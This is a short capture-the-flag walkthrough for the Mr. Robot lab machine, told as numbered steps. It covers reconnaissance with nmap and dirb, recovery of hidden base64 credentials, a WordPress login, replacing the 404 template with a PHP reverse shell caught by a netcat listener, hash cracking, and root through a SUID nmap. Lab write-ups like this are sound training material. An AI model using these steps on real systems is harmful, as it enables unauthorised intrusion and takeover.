1) 
- nmap IP
2)
- connect to IP via browser and go to /robots.txt
- go to IP/key-1-of-3.txt
3) 
- go to IP/fsocity.dic
- this looks like a dicitonary to use for a bruteforce
4) 
- run dirb on the IP, i used the given wordlist but im sure others would work
- go to IP/lisence
- inspect element, next to the text there is hidden base64
- elliot:ER28-0652 (obviously a username and password, probably ssh)
- ssh is closed so i kept looking
5) 
- go to /login and it redirects you to a wp login, use the credentials here and it works
- on the users tab we get the following:
Username Name Email Role
elliot	Elliot Alderson	elliot@mrrobot.com	Administrator
mich05654 krista Gordon	kgordon@therapist.com	Subscriber
- go to appearance
- editor
- change the php of the 404 page to a php reverse shell https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
- nc -lvnp 1234
- go to the 404 page
- on your new shell navigate to the robot directory (/home/robot) and crack the has inside password.raw-md5
- abcdefghijklmnopqrstuvwxyz
6) 
- trying to su - robot requires a shell so we do `python -c 'import pty; pty.spawn("/bin/bash")'` 
- su robot with password found earlier
- cat the flag file you previously could
7)
- find / -perm -u=s -type f 2>/dev/null
- we see nmap is being ran with admins perms
- nmap --interactive
- /bin/bash
- !sh
- cat /root/key-3-of-3.txt
